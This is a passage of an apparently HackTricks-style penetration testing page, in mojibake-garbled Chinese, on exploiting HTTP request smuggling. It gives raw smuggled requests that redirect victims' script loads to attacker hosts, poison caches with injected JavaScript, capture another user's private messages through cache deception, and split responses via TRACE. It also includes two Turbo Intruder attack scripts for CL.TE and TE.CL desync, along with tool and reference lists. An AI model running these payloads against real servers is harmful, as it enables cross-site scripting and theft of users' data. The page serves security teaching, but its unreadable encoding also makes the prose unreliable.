<p>è¿™ä¸ªè¢«èµ°ç§çš„è¯·æ±‚å¯èƒ½å¯¼è‡´ä¸‹ä¸€ä¸ªå¤„ç†çš„ç”¨æˆ·è¯·æ±‚è¢«é‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ï¼š</p>
<pre><code>GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
</code></pre>
<p>ç»“æœä¸ºï¼š</p>
<pre><code>HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
</code></pre>
<p>åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œç”¨æˆ·å¯¹ JavaScript æ–‡ä»¶çš„è¯·æ±‚è¢«åŠ«æŒã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å“åº”ä¸­æä¾›æ¶æ„ JavaScript æ¥æ½œåœ¨åœ°å±å®³ç”¨æˆ·ã€‚</p>
<h3 id="é€šè¿‡-http-è¯·æ±‚èµ°ç§åˆ©ç”¨-web-ç¼“å­˜ä¸­æ¯’"><a class="header" href="#é€šè¿‡-http-è¯·æ±‚èµ°ç§åˆ©ç”¨-web-ç¼“å­˜ä¸­æ¯’">é€šè¿‡ HTTP è¯·æ±‚èµ°ç§åˆ©ç”¨ Web ç¼“å­˜ä¸­æ¯’ <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a></a></h3>
<p>å¦‚æœ <strong>å‰ç«¯åŸºç¡€è®¾æ–½çš„ä»»ä½•ç»„ä»¶ç¼“å­˜å†…å®¹</strong>ï¼Œåˆ™å¯ä»¥æ‰§è¡Œ Web ç¼“å­˜ä¸­æ¯’ï¼Œé€šå¸¸æ˜¯ä¸ºäº†æé«˜æ€§èƒ½ã€‚é€šè¿‡æ“çºµæœåŠ¡å™¨çš„å“åº”ï¼Œå¯ä»¥ <strong>æ¯’åŒ–ç¼“å­˜</strong>ã€‚</p>
<p>ä¹‹å‰ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°å¦‚ä½•å¯ä»¥æ›´æ”¹æœåŠ¡å™¨å“åº”ä»¥è¿”å› 404 é”™è¯¯ï¼ˆå‚è§ <a href="./#basic-examples">åŸºæœ¬ç¤ºä¾‹</a>ï¼‰ã€‚åŒæ ·ï¼Œå¯ä»¥æ¬ºéª—æœåŠ¡å™¨ä»¥å“åº”å¯¹ <code>/static/include.js</code> çš„è¯·æ±‚è€Œæä¾› <code>/index.html</code> å†…å®¹ã€‚å› æ­¤ï¼Œ<code>/static/include.js</code> çš„å†…å®¹åœ¨ç¼“å­˜ä¸­è¢«æ›¿æ¢ä¸º <code>/index.html</code> çš„å†…å®¹ï¼Œä½¿å¾— <code>/static/include.js</code> å¯¹ç”¨æˆ·ä¸å¯è®¿é—®ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡æ‹’ç»ï¼ˆDoSï¼‰ã€‚</p>
<p>å¦‚æœå‘ç° <strong>å¼€æ”¾é‡å®šå‘æ¼æ´</strong> æˆ–è€…å­˜åœ¨ <strong>æŒ‡å‘å¼€æ”¾é‡å®šå‘çš„ç«™å†…é‡å®šå‘</strong>ï¼Œè¿™ç§æŠ€æœ¯å˜å¾—ç‰¹åˆ«å¼ºå¤§ã€‚è¿™äº›æ¼æ´å¯ä»¥è¢«åˆ©ç”¨æ¥å°† <code>/static/include.js</code> çš„ç¼“å­˜å†…å®¹æ›¿æ¢ä¸ºæ”»å‡»è€…æ§åˆ¶çš„è„šæœ¬ï¼Œä»è€Œå®è´¨ä¸Šä½¿æ‰€æœ‰è¯·æ±‚æ›´æ–°çš„ <code>/static/include.js</code> çš„å®¢æˆ·ç«¯é¢ä¸´å¹¿æ³›çš„è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ”»å‡»ã€‚</p>
<p>ä¸‹é¢æ˜¯åˆ©ç”¨ <strong>ç¼“å­˜ä¸­æ¯’ç»“åˆç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘</strong> çš„ç¤ºä¾‹ã€‚ç›®æ ‡æ˜¯æ›´æ”¹ <code>/static/include.js</code> çš„ç¼“å­˜å†…å®¹ï¼Œä»¥æä¾›ç”±æ”»å‡»è€…æ§åˆ¶çš„ JavaScript ä»£ç ï¼š</p>
<pre><code>POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
</code></pre>
<p>æ³¨æ„åµŒå…¥çš„è¯·æ±‚é’ˆå¯¹ <code>/post/next?postId=3</code>ã€‚è¯¥è¯·æ±‚å°†è¢«é‡å®šå‘åˆ° <code>/post?postId=4</code>ï¼Œåˆ©ç”¨ <strong>Host å¤´éƒ¨å€¼</strong> æ¥ç¡®å®šåŸŸåã€‚é€šè¿‡æ›´æ”¹ <strong>Host å¤´éƒ¨</strong>ï¼Œæ”»å‡»è€…å¯ä»¥å°†è¯·æ±‚é‡å®šå‘åˆ°ä»–ä»¬çš„åŸŸå (<strong>ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘</strong>)ã€‚</p>
<p>åœ¨æˆåŠŸçš„ <strong>socket poisoning</strong> ä¹‹åï¼Œåº”å‘èµ·å¯¹ <code>/static/include.js</code> çš„ <strong>GET è¯·æ±‚</strong>ã€‚è¯¥è¯·æ±‚å°†å—åˆ°å…ˆå‰ <strong>ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘</strong> è¯·æ±‚çš„æ±¡æŸ“ï¼Œå¹¶è·å–ç”±æ”»å‡»è€…æ§åˆ¶çš„è„šæœ¬å†…å®¹ã€‚</p>
<p>éšåï¼Œä»»ä½•å¯¹ <code>/static/include.js</code> çš„è¯·æ±‚å°†æä¾›æ”»å‡»è€…è„šæœ¬çš„ç¼“å­˜å†…å®¹ï¼Œæœ‰æ•ˆåœ°å‘èµ·å¹¿æ³›çš„ XSS æ”»å‡»ã€‚</p>
<h3 id="ä½¿ç”¨-http-è¯·æ±‚èµ°ç§è¿›è¡Œç½‘ç»œç¼“å­˜æ¬ºéª—"><a class="header" href="#ä½¿ç”¨-http-è¯·æ±‚èµ°ç§è¿›è¡Œç½‘ç»œç¼“å­˜æ¬ºéª—">ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§è¿›è¡Œç½‘ç»œç¼“å­˜æ¬ºéª— <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a></a></h3>
<blockquote>
<p><strong>ç½‘ç»œç¼“å­˜ä¸­æ¯’å’Œç½‘ç»œç¼“å­˜æ¬ºéª—æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></p>
<ul>
<li>åœ¨ <strong>ç½‘ç»œç¼“å­˜ä¸­æ¯’</strong> ä¸­ï¼Œæ”»å‡»è€…ä½¿åº”ç”¨ç¨‹åºåœ¨ç¼“å­˜ä¸­å­˜å‚¨ä¸€äº›æ¶æ„å†…å®¹ï¼Œå¹¶ä¸”è¿™äº›å†…å®¹ä»ç¼“å­˜ä¸­æä¾›ç»™å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚</li>
<li>åœ¨ <strong>ç½‘ç»œç¼“å­˜æ¬ºéª—</strong> ä¸­ï¼Œæ”»å‡»è€…ä½¿åº”ç”¨ç¨‹åºåœ¨ç¼“å­˜ä¸­å­˜å‚¨å±äºå¦ä¸€ä¸ªç”¨æˆ·çš„ä¸€äº›æ•æ„Ÿå†…å®¹ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢è¿™äº›å†…å®¹ã€‚</li>
</ul>
</blockquote>
<p>æ”»å‡»è€…æ„é€ ä¸€ä¸ªèµ°ç§è¯·æ±‚ï¼Œä»¥è·å–æ•æ„Ÿçš„ç”¨æˆ·ç‰¹å®šå†…å®¹ã€‚è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼š</p>
<pre><code class="language-markdown">`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
</code></pre>
<p>å¦‚æœè¿™ä¸ªè¢«èµ°ç§çš„è¯·æ±‚æ±¡æŸ“äº†ç”¨äºé™æ€å†…å®¹çš„ç¼“å­˜æ¡ç›®ï¼ˆä¾‹å¦‚ï¼Œ<code>/someimage.png</code>ï¼‰ï¼Œé‚£ä¹ˆå—å®³è€…åœ¨<code>/private/messages</code>ä¸­çš„æ•æ„Ÿæ•°æ®å¯èƒ½ä¼šè¢«ç¼“å­˜åˆ°é™æ€å†…å®¹çš„ç¼“å­˜æ¡ç›®ä¸‹ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ£€ç´¢åˆ°è¿™äº›ç¼“å­˜çš„æ•æ„Ÿæ•°æ®ã€‚</p>
<h3 id="é€šè¿‡httpè¯·æ±‚èµ°ç§æ»¥ç”¨trace"><a class="header" href="#é€šè¿‡httpè¯·æ±‚èµ°ç§æ»¥ç”¨trace">é€šè¿‡HTTPè¯·æ±‚èµ°ç§æ»¥ç”¨TRACE <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a></a></h3>
<p><a href="https://portswigger.net/research/trace-desync-attack"><strong>åœ¨è¿™ç¯‡æ–‡ç« ä¸­</strong></a> å»ºè®®å¦‚æœæœåŠ¡å™¨å¯ç”¨äº†TRACEæ–¹æ³•ï¼Œå¯èƒ½ä¼šé€šè¿‡HTTPè¯·æ±‚èµ°ç§è¿›è¡Œæ»¥ç”¨ã€‚è¿™æ˜¯å› ä¸ºè¯¥æ–¹æ³•ä¼šå°†å‘é€åˆ°æœåŠ¡å™¨çš„ä»»ä½•å¤´éƒ¨åå°„ä¸ºå“åº”ä½“çš„ä¸€éƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code>TRACE / HTTP/1.1
Host: example.com
XSS: &lt;script&gt;alert("TRACE")&lt;/script&gt;
</code></pre>
<p>å°†å‘é€å¦‚ä¸‹å“åº”ï¼š</p>
<pre><code>HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: &lt;script&gt;alert("TRACE")&lt;/script&gt;
X-Forwarded-For: xxx.xxx.xxx.xxx
</code></pre>
<p>ä¸€ä¸ªæ»¥ç”¨è¿™ç§è¡Œä¸ºçš„ä¾‹å­æ˜¯<strong>é¦–å…ˆä¼ªè£…ä¸€ä¸ªHEADè¯·æ±‚</strong>ã€‚è¿™ä¸ªè¯·æ±‚å°†åªä¼šè¿”å›ä¸€ä¸ªGETè¯·æ±‚çš„<strong>å¤´éƒ¨</strong>ï¼ˆå…¶ä¸­åŒ…æ‹¬**<code>Content-Type</code><strong>ï¼‰ã€‚ç„¶ååœ¨HEADè¯·æ±‚å</strong>ç«‹å³ä¼ªè£…ä¸€ä¸ªTRACEè¯·æ±‚**ï¼Œè¯¥è¯·æ±‚å°†<strong>åå°„å‘é€çš„æ•°æ®</strong>ã€‚<br />
ç”±äºHEADå“åº”å°†åŒ…å«ä¸€ä¸ª<code>Content-Length</code>å¤´ï¼Œ<strong>TRACEè¯·æ±‚çš„å“åº”å°†è¢«è§†ä¸ºHEADå“åº”çš„ä¸»ä½“ï¼Œå› æ­¤åœ¨å“åº”ä¸­åå°„ä»»æ„æ•°æ®</strong>ã€‚<br />
è¿™ä¸ªå“åº”å°†è¢«å‘é€åˆ°è¿æ¥ä¸Šçš„ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œå› æ­¤è¿™å¯ä»¥<strong>ç”¨äºç¼“å­˜çš„JSæ–‡ä»¶ä¸­ï¼Œä¾‹å¦‚æ³¨å…¥ä»»æ„çš„JSä»£ç </strong>ã€‚</p>
<h3 id="é€šè¿‡httpå“åº”æ‹†åˆ†æ»¥ç”¨trace"><a class="header" href="#é€šè¿‡httpå“åº”æ‹†åˆ†æ»¥ç”¨trace">é€šè¿‡HTTPå“åº”æ‹†åˆ†æ»¥ç”¨TRACE <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a></a></h3>
<p>ç»§ç»­å…³æ³¨<a href="https://portswigger.net/research/trace-desync-attack"><strong>è¿™ç¯‡æ–‡ç« </strong></a>å»ºè®®äº†å¦ä¸€ç§æ»¥ç”¨TRACEæ–¹æ³•çš„æ–¹å¼ã€‚å¦‚è¯„è®ºæ‰€è¿°ï¼Œä¼ªè£…ä¸€ä¸ªHEADè¯·æ±‚å’Œä¸€ä¸ªTRACEè¯·æ±‚å¯ä»¥<strong>æ§åˆ¶HEADè¯·æ±‚å“åº”ä¸­çš„ä¸€äº›åå°„æ•°æ®</strong>ã€‚HEADè¯·æ±‚ä¸»ä½“çš„é•¿åº¦åŸºæœ¬ä¸Šåœ¨Content-Lengthå¤´ä¸­æŒ‡ç¤ºï¼Œå¹¶ç”±TRACEè¯·æ±‚çš„å“åº”å½¢æˆã€‚</p>
<p>å› æ­¤ï¼Œæ–°çš„æƒ³æ³•æ˜¯ï¼ŒçŸ¥é“è¿™ä¸ªContent-Lengthå’ŒTRACEå“åº”ä¸­ç»™å‡ºçš„æ•°æ®ï¼Œå¯ä»¥ä½¿TRACEå“åº”åœ¨Content-Lengthçš„æœ€åä¸€ä¸ªå­—èŠ‚ä¹‹ååŒ…å«ä¸€ä¸ªæœ‰æ•ˆçš„HTTPå“åº”ï¼Œä»è€Œå…è®¸æ”»å‡»è€…å®Œå…¨æ§åˆ¶ä¸‹ä¸€ä¸ªå“åº”çš„è¯·æ±‚ï¼ˆè¿™å¯ä»¥ç”¨äºæ‰§è¡Œç¼“å­˜æ±¡æŸ“ï¼‰ã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code>GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
&lt;script&gt;alert("response splitting")&lt;/script&gt;
</code></pre>
<p>å°†ç”Ÿæˆè¿™äº›å“åº”ï¼ˆæ³¨æ„HEADå“åº”å…·æœ‰Content-Lengthï¼Œä½¿å¾—TRACEå“åº”æˆä¸ºHEADä¸»ä½“çš„ä¸€éƒ¨åˆ†ï¼Œä¸€æ—¦HEAD Content-Lengthç»“æŸï¼Œä¸€ä¸ªæœ‰æ•ˆçš„HTTPå“åº”è¢«èµ°ç§ï¼‰ï¼š</p>
<pre><code>HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

&lt;script&gt;alert(â€œarbitrary responseâ€)&lt;/script&gt;
</code></pre>
<h3 id="åˆ©ç”¨httpå“åº”ä¸åŒæ­¥è¿›è¡Œhttpè¯·æ±‚èµ°ç§"><a class="header" href="#åˆ©ç”¨httpå“åº”ä¸åŒæ­¥è¿›è¡Œhttpè¯·æ±‚èµ°ç§">åˆ©ç”¨HTTPå“åº”ä¸åŒæ­¥è¿›è¡ŒHTTPè¯·æ±‚èµ°ç§</a></h3>
<p>æ‚¨æ˜¯å¦å‘ç°äº†ä¸€äº›HTTPè¯·æ±‚èµ°ç§æ¼æ´ï¼Œä½†ä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨å®ƒï¼Ÿå°è¯•è¿™äº›å…¶ä»–çš„åˆ©ç”¨æ–¹æ³•ï¼š</p>
<p>{% content-ref url="../http-response-smuggling-desync.md" %}
<a href="../http-response-smuggling-desync.html">http-response-smuggling-desync.md</a>
{% endcontent-ref %}</p>
<h3 id="å…¶ä»–httpè¯·æ±‚èµ°ç§æŠ€æœ¯"><a class="header" href="#å…¶ä»–httpè¯·æ±‚èµ°ç§æŠ€æœ¯">å…¶ä»–HTTPè¯·æ±‚èµ°ç§æŠ€æœ¯</a></h3>
<ul>
<li>æµè§ˆå™¨HTTPè¯·æ±‚èµ°ç§ï¼ˆå®¢æˆ·ç«¯ï¼‰</li>
</ul>
<p>{% content-ref url="browser-http-request-smuggling.md" %}
<a href="browser-http-request-smuggling.html">browser-http-request-smuggling.md</a>
{% endcontent-ref %}</p>
<ul>
<li>HTTP/2é™çº§ä¸­çš„è¯·æ±‚èµ°ç§</li>
</ul>
<p>{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
<a href="request-smuggling-in-http-2-downgrades.html">request-smuggling-in-http-2-downgrades.md</a>
{% endcontent-ref %}</p>
<h2 id="turboå…¥ä¾µè€…è„šæœ¬"><a class="header" href="#turboå…¥ä¾µè€…è„šæœ¬">Turboå…¥ä¾µè€…è„šæœ¬</a></h2>
<h3 id="clte"><a class="header" href="#clte">CL.TE</a></h3>
<p>æ¥è‡ª <a href="https://hipotermia.pw/bb/http-desync-idor">https://hipotermia.pw/bb/http-desync-idor</a></p>
<pre><code class="language-python">def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
</code></pre>
<h3 id="tecl"><a class="header" href="#tecl">TE.CL</a></h3>
<p>æ¥è‡ª: <a href="https://hipotermia.pw/bb/http-desync-account-takeover">https://hipotermia.pw/bb/http-desync-account-takeover</a></p>
<pre><code class="language-python">def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
</code></pre>
<h2 id="å·¥å…·"><a class="header" href="#å·¥å…·">å·¥å…·</a></h2>
<ul>
<li><a href="https://github.com/anshumanpattnaik/http-request-smuggling">https://github.com/anshumanpattnaik/http-request-smuggling</a></li>
<li><a href="https://github.com/PortSwigger/http-request-smuggler">https://github.com/PortSwigger/http-request-smuggler</a></li>
<li><a href="https://github.com/gwen001/pentest-tools/blob/master/smuggler.py">https://github.com/gwen001/pentest-tools/blob/master/smuggler.py</a></li>
<li><a href="https://github.com/defparam/smuggler">https://github.com/defparam/smuggler</a></li>
<li><a href="https://github.com/Moopinger/smugglefuzz">https://github.com/Moopinger/smugglefuzz</a></li>
<li><a href="https://github.com/bahruzjabiyev/t-reqs-http-fuzzer">https://github.com/bahruzjabiyev/t-reqs-http-fuzzer</a>: è¯¥å·¥å…·æ˜¯ä¸€ä¸ªåŸºäºè¯­æ³•çš„HTTPæ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œæœ‰åŠ©äºå‘ç°å¥‡æ€ªçš„è¯·æ±‚èµ°ç§å·®å¼‚ã€‚</li>
</ul>
<h2 id="å‚è€ƒèµ„æ–™"><a class="header" href="#å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</a></h2>
<ul>
<li><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a></li>
<li><a href="https://portswigger.net/web-security/request-smuggling/finding">https://portswigger.net/web-security/request-smuggling/finding</a></li>
<li><a href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a></li>
<li><a href="https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4">https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4</a></li>
<li><a href="https://github.com/haroonawanofficial/HTTP-Desync-Attack/">https://github.com/haroonawanofficial/HTTP-Desync-Attack/</a></li>
<li><a href="https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html">https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html</a></li>
<li><a href="https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/">https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/</a></li>
<li><a href="https://portswigger.net/research/trace-desync-attack">https://portswigger.net/research/trace-desync-attack</a></li>
<li><a href="https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/">https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/</a></li>
</ul>
<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>ä»é»‘å®¢çš„è§’åº¦çœ‹å¾…æ‚¨çš„ç½‘ç»œåº”ç”¨ã€ç½‘ç»œå’Œäº‘</strong></p>
<p><strong>å‘ç°å¹¶æŠ¥å‘Šå…·æœ‰å®é™…å•†ä¸šå½±å“çš„å…³é”®å¯åˆ©ç”¨æ¼æ´ã€‚</strong> ä½¿ç”¨æˆ‘ä»¬20å¤šä¸ªè‡ªå®šä¹‰å·¥å…·æ¥æ˜ å°„æ”»å‡»é¢ï¼Œæ‰¾åˆ°è®©æ‚¨æå‡æƒé™çš„å®‰å…¨é—®é¢˜ï¼Œå¹¶ä½¿ç”¨è‡ªåŠ¨åŒ–æ¼æ´æ”¶é›†é‡è¦è¯æ®ï¼Œå°†æ‚¨çš„è¾›å‹¤å·¥ä½œè½¬åŒ–ä¸ºæœ‰è¯´æœåŠ›çš„æŠ¥å‘Šã€‚</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒHackTricks</summary>
<ul>
<li>æŸ¥çœ‹<a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discordç¾¤ç»„</strong></a>æˆ–<a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a>æˆ–<strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>å’Œ<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHubåº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/http-connection-request-smuggling.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/http-request-smuggling/browser-http-request-smuggling.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/http-connection-request-smuggling.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/http-request-smuggling/browser-http-request-smuggling.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
